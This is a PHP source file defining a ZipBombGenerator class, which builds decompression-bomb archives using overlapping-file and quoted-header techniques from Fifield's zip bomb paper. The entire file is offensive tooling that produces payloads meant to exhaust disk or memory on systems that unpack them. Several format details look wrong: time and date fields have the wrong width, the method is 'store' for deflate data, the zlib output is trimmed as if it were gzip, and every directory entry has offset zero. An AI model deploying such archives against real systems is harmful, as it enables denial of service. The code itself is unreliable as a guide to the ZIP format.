<?php

declare(strict_types=1);

namespace App\Infrastructure\ZipBomb;

/**
 * Generates zip bombs based on techniques from USENIX WOOT 2019 paper
 * "A better zip bomb" by David Fifield
 *
 * Key techniques:
 * 1. Overlapping files - one highly compressed "kernel" reused multiple times
 * 2. Quoting headers - DEFLATE non-compressed blocks to wrap local file headers
 */
final readonly class ZipBombGenerator
{
    private const string ZIP_LOCAL_FILE_HEADER = "\x50\x4b\x03\x04";

    private const string ZIP_CENTRAL_DIRECTORY_HEADER = "\x50\x4b\x01\x02";

    private const string ZIP_END_OF_CENTRAL_DIRECTORY = "\x50\x4b\x05\x06";

    /**
     * Generate a zip bomb with overlapping files
     *
     * @param int $numFiles Number of files to create
     * @param int $kernelSize Size of the kernel in bytes (uncompressed)
     * @param string $alphabet Characters to use for filenames
     * @return string Binary zip data
     */
    public function generate(
        int $numFiles = 10,
        int $kernelSize = 100000,
        string $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    ): string {
        $kernel = $this->generateKernel($kernelSize);
        $compressedKernel = $this->compressKernel($kernel);

        $localFileHeaders = '';
        $centralDirectory = '';
        $offset = 0;

        // Build local file headers with quoting (non-compressed DEFLATE blocks)
        for ($i = $numFiles - 1; $i >= 0; $i--) {
            $filename = $alphabet[$i % strlen($alphabet)];
            $localHeader = $this->buildLocalFileHeader($filename, strlen($kernel), $offset);

            // Wrap in DEFLATE non-compressed block (BTYPE=00)
            $quotedHeader = $this->quoteAsDeflateBlock($localHeader);

            $localFileHeaders .= $quotedHeader;

            // Build central directory entry
            $centralEntry = $this->buildCentralDirectoryEntry(
                $filename,
                strlen($kernel),
                $offset,
                strlen($compressedKernel)
            );
            $centralDirectory .= $centralEntry;

            $offset += strlen($compressedKernel);
        }

        // Add the actual compressed kernel at the end
        $localFileHeaders .= $compressedKernel;

        // Build end of central directory record
        $endOfCentralDirectory = $this->buildEndOfCentralDirectory(
            strlen($centralDirectory),
            strlen($localFileHeaders),
            $numFiles
        );

        return $localFileHeaders . $centralDirectory . $endOfCentralDirectory;
    }

    /**
     * Generate a kernel with highly compressible data (repeated bytes)
     */
    private function generateKernel(int $size): string
    {
        // Use repeated 'a' characters for maximum compressibility
        return str_repeat('a', $size);
    }

    /**
     * Compress the kernel using DEFLATE
     */
    private function compressKernel(string $kernel): string
    {
        $compressed = gzcompress($kernel, 9);
        if ($compressed === false) {
            throw new \RuntimeException('Failed to compress kernel');
        }
        // Remove gzip header and footer, keep only DEFLATE stream
        return substr($compressed, 10, -8);
    }

    /**
     * Build a zip local file header
     */
    private function buildLocalFileHeader(string $filename, int $uncompressedSize, int $offset): string
    {
        $filenameLength = strlen($filename);
        $extraLength = 0;

        $header = self::ZIP_LOCAL_FILE_HEADER;
        $header .= pack('v', 0x000A); // Version needed to extract
        $header .= pack('v', 0x0000); // General purpose bit flag
        $header .= pack('v', 0x0000); // Compression method (0 = store)
        $header .= pack('V', 0); // Last mod time
        $header .= pack('V', 0); // Last mod date
        $header .= pack('V', crc32(str_repeat('a', $uncompressedSize))); // CRC-32
        $header .= pack('V', $uncompressedSize); // Compressed size
        $header .= pack('V', $uncompressedSize); // Uncompressed size
        $header .= pack('v', $filenameLength); // Filename length
        $header .= pack('v', $extraLength); // Extra field length
        $header .= $filename; // Filename
        $header .= str_repeat("\x00", $extraLength); // Extra field

        return $header;
    }

    /**
     * Quote a local file header as a DEFLATE non-compressed block
     * This is the key technique from the paper - wrapping headers in BTYPE=00 blocks
     */
    private function quoteAsDeflateBlock(string $data): string
    {
        $len = strlen($data);
        $nlen = ~$len & 0xFFFF; // One's complement

        // DEFLATE non-compressed block header
        // BFINAL=0 (not final), BTYPE=00 (no compression)
        $blockHeader = chr(0b00000000);

        // LEN and NLEN (little-endian)
        $blockHeader .= pack('v', $len);
        $blockHeader .= pack('v', $nlen);

        return $blockHeader . $data;
    }

    /**
     * Build a central directory entry
     */
    private function buildCentralDirectoryEntry(
        string $filename,
        int $uncompressedSize,
        int $offset,
        int $compressedSize
    ): string {
        $filenameLength = strlen($filename);
        $extraLength = 0;
        $commentLength = 0;

        $entry = self::ZIP_CENTRAL_DIRECTORY_HEADER;
        $entry .= pack('v', 0x000A); // Version made by
        $entry .= pack('v', 0x000A); // Version needed to extract
        $entry .= pack('v', 0x0000); // General purpose bit flag
        $entry .= pack('v', 0x0000); // Compression method
        $entry .= pack('V', 0); // Last mod time
        $entry .= pack('V', 0); // Last mod date
        $entry .= pack('V', crc32(str_repeat('a', $uncompressedSize))); // CRC-32
        $entry .= pack('V', $compressedSize); // Compressed size
        $entry .= pack('V', $uncompressedSize); // Uncompressed size
        $entry .= pack('v', $filenameLength); // Filename length
        $entry .= pack('v', $extraLength); // Extra field length
        $entry .= pack('v', $commentLength); // File comment length
        $entry .= pack('v', 0); // Disk number start
        $entry .= pack('v', 0); // Internal file attributes
        $entry .= pack('V', 0x81A40000); // External file attributes (Unix file, regular file)
        $entry .= pack('V', 0); // Relative offset of local header
        $entry .= $filename; // Filename
        $entry .= str_repeat("\x00", $extraLength); // Extra field
        $entry .= str_repeat("\x00", $commentLength); // Comment

        return $entry;
    }

    /**
     * Build end of central directory record
     */
    private function buildEndOfCentralDirectory(int $centralDirectorySize, int $localHeadersSize, int $numFiles): string
    {
        $record = self::ZIP_END_OF_CENTRAL_DIRECTORY;
        $record .= pack('v', 0); // Number of this disk
        $record .= pack('v', 0); // Disk with start of central directory
        $record .= pack('v', $numFiles); // Number of entries on this disk
        $record .= pack('v', $numFiles); // Total number of entries
        $record .= pack('V', $centralDirectorySize); // Size of central directory
        $record .= pack('V', $localHeadersSize); // Offset of start of central directory
        $record .= pack('v', 0); // ZIP file comment length

        return $record;
    }
}
